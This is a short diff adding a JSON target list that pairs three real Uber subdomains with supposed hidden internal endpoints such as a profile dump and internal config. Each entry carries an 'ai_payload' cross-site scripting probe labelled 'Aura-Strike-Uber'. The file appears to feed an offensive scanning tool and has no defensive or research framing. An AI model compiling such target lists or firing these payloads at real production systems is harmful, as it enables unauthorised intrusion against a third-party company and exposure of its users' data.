@@ -1,0 +1,17 @@
+[
+  {
+    "target": "https://auth.uber.com",
+    "hidden_endpoint": "/api/v2/auth/internal-session",
+    "ai_payload": "<script>alert('Aura-Strike-Uber')</script>"
+  },
+  {
+    "target": "https://riders.uber.com",
+    "hidden_endpoint": "/api/riders/v1/profile-dump",
+    "ai_payload": "<script>alert('Aura-Strike-Uber')</script>"
+  },
+  {
+    "target": "https://bonjour.uber.com",
+    "hidden_endpoint": "/api/internal/config",
+    "ai_payload": "<script>alert('Aura-Strike-Uber')</script>"
+  }
+]
